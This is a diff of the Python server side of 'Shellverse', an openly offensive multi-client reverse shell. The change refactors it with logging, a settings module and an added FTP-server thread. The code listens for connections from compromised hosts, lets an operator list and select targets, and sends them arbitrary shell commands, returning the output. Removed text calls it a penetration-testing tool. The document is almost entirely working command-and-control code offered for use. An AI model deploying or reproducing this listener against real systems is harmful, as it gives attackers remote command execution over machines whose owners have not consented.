@@ -6,80 +6,46 @@ from queue import Queue
 import struct
 import signal
 import os
-ABOUT='''
-Shellverse is a reverse shell program coded by the Jak Hax for penetration testing
-This is a multi-client, multi-threaded reverse shell written in Python.
-It's open source.
-Disclaimer: This reverse shell should only be used in authorized penetration testing .
-Accessing a computer network without authorization or permission is illegal.
-                '''
-payloads='''
-
-'''
-
-NUMBER_OF_THREADS = 2
-JOB_NUMBER = [1, 2]
-queue = Queue()
+from server.verbose import logo,about
+from utils import logger
+from server import settings
+from server.handlers import ftp_server
 
 COMMANDS = {'help':['Shows this help list'],
             'list':['show  connected targets'],
-             'about':['print details about shellverse'],
-            'show payloads':['show additional exploits'],
+            'about':['print details about shellverse'],
             'select':['Selects a target by its index. Takes index as a parameter'],
             'quit':['Stops current connection with a target. To be used when target is selected'],
             'shutdown':['Shuts server down'],
            }
 
-logo=''' 
-  _________ .__               .__    .__                                               
- /   _____/ |  |__     ____   |  |   |  |   ___  __   ____   _______    ______   ____  
- \_____  \  |  |  \  _/ __ \  |  |   |  |   \  \/ / _/ __ \  \_  __ \  /  ___/ _/ __ \ 
- /        \ |   Y  \ \  ___/  |  |__ |  |__  \   /  \  ___/   |  | \/  \___ \  \  ___/ 
-/_______  / |___|  /  \___  > |____/ |____/   \_/    \___  >  |__|    /____  >  \___  >
-        \/       \/       \/                             \/                \/       \/ 
+def print_help():
+    for cmd, v in COMMANDS.items():
+        print("{0}:\t{1}".format(cmd, v[0]))
 
-shellverse is a reverse shell exploit tool coded by Jak Hax
-'''
-print(logo)
-Host_=input('Enter Host address>')
-if os.path.exists('%s\\host.txt'%os.getcwd()):
-    try:
-        with open('host.txt','r') as dat:
-            Host_='%s'%dat.read()
-    except:
-        pass
+class Server(object):
 
-class MultiServer(object):
     def __init__(self):
-        self.host = Host_
-        self.port = 9999
+        self.host = settings.SERVER_ADDR
+        self.port = settings.SERVER_PORT
         self.socket = None
         self.all_connections = []
         self.all_addresses = []
-
-    def print_help(self):
-        for cmd, v in COMMANDS.items():
-            print("{0}:\t{1}".format(cmd, v[0]))
-        return
-    def print_about(self):
-        print(ABOUT)
-        return
-    def show_payloads(self):
-         print(payloads)
+ 
     def register_signal_handler(self):
         signal.signal(signal.SIGINT, self.quit_gracefully)
         signal.signal(signal.SIGTERM, self.quit_gracefully)
         return
 
     def quit_gracefully(self, signal=None, frame=None):
-        print('\nQuitting gracefully')
+        logger.info('Quitting gracefully')
         for conn in self.all_connections:
             try:
                 conn.shutdown(2)
                 conn.close()
             except Exception as e:
+                logger.exception(e)
                 print('Could not close connection %s' % str(e))
-                # continue
         self.socket.close()
         sys.exit(0)
 
@@ -87,8 +53,8 @@ class MultiServer(object):
         try:
             self.socket = socket.socket()
         except socket.error as msg:
+            logger.exception(msg)
             print("Socket creation error: " + str(msg))
-            # TODO: Added exit
             sys.exit(1)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         return
@@ -99,8 +65,9 @@ class MultiServer(object):
             self.socket.bind((self.host, self.port))
             self.socket.listen(5)
         except socket.error as e:
+            logger.exception(e)
             print("Socket binding error: " + str(e))
-            time.sleep(5)
+            time.sleep(settings.RETRY_TIME)
             self.socket_bind()
         return
 
@@ -117,21 +84,23 @@ class MultiServer(object):
                 client_hostname = conn.recv(1024).decode("utf-8")
                 address = address + (client_hostname,)
             except Exception as e:
+                logger.exception(e)
                 print('Error accepting connections: %s' % str(e))
                 # Loop indefinitely
                 continue
             self.all_connections.append(conn)
             self.all_addresses.append(address)
+            logger.info('Connection has been established: {0} ({1})'.format(address[-1], address[0]))
             print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
         return
 
     def start_shelverse(self):
-        """ Interactive prompt for sending commands remotely """
         while True:
             cmd = input('shelverse> ')
-            if cmd == 'list':
+            if not cmd or cmd.split()[0] not in COMMANDS.keys():
+                print("Command not recognized")
+            elif cmd == 'list':
                 self.list_connections()
-                continue
             elif 'select' in cmd:
                 target, conn = self.get_target(cmd)
                 if conn is not None:
@@ -139,15 +108,9 @@ class MultiServer(object):
             elif cmd == 'shutdown':
                     queue.task_done()
                     queue.task_done()
-                    print('Server shutdown')
                     break
-                    # self.quit_gracefully()
             elif cmd == 'help':
-                self.print_help()
-            elif cmd=='about':
-                self.print_about()
-            elif cmd=='show payloads':
-                self.show_payloads()
+                print_help()
             elif cmd == '':
                 pass
             else:
@@ -161,7 +124,8 @@ class MultiServer(object):
             try:
                 conn.send(str.encode(' '))
                 conn.recv(20480)
-            except:
+            except Exception as e:
+                logger.exception(e)
                 del self.all_connections[i]
                 del self.all_addresses[i]
                 continue
@@ -177,12 +141,14 @@ class MultiServer(object):
         target = cmd.split(' ')[-1]
         try:
             target = int(target)
-        except:
+        except Exception as e:
+            logger.exception(e)
             print('Client index should be an integer')
             return None, None
         try:
             conn = self.all_connections[target]
-        except IndexError:
+        except IndexError as e:
+            logger.exception(e)
             print('Not a valid selection')
             return None, None
         print("You are now connected to " + str(self.all_addresses[target][2]))
@@ -225,9 +191,6 @@ class MultiServer(object):
         while True:
             try:
                 cmd = input()
-                if cmd=='show exploits':
-                    self.show_exploits()
-                    cmd='echo exploits'
                 if len(str.encode(cmd)) > 0:
                     conn.send(str.encode(cmd))
                     cmd_output = self.read_command_output(conn)
@@ -236,6 +199,7 @@ class MultiServer(object):
                 if cmd == 'quit':
                     break
             except Exception as e:
+                logger.exception(e)
                 print("Connection was lost %s" %str(e))
                 break
         del self.all_connections[target]
@@ -243,19 +207,26 @@ class MultiServer(object):
         return
 
 
+NUMBER_OF_WORKERS = 3
+queue = Queue()
+
 def create_workers():
     """ Create worker threads (will die when main exits) """
-    server = MultiServer()
+    server = Server()
     server.register_signal_handler()
-    for _ in range(NUMBER_OF_THREADS):
+    for _ in range(NUMBER_OF_WORKERS):
         t = threading.Thread(target=work, args=(server,))
         t.daemon = True
         t.start()
     return
 
-
 def work(server):
-    """ Do the next job in the queue (thread for handling connections, another for sending commands)
+    """ 
+    Do the next job in the queue (threads for handling connections, sending commands,start ftp server)
+    threads for:
+        handling connections, 
+        sending commands
+        start ftp server
     :param server:
     """
     while True:
@@ -266,21 +237,21 @@ def work(server):
             server.accept_connections()
         if x == 2:
             server.start_shelverse()
+        if x== 3:
+            ftp_server.basic_ftp_server()
         queue.task_done()
     return
 
 def create_jobs():
     """ Each list item is a new job """
-    for x in JOB_NUMBER:
+    for x in list(range(1,NUMBER_OF_WORKERS+1)):
         queue.put(x)
     queue.join()
     return
 
 def main():
-
     create_workers()
     create_jobs()
-
 
 if __name__ == '__main__':
     main()
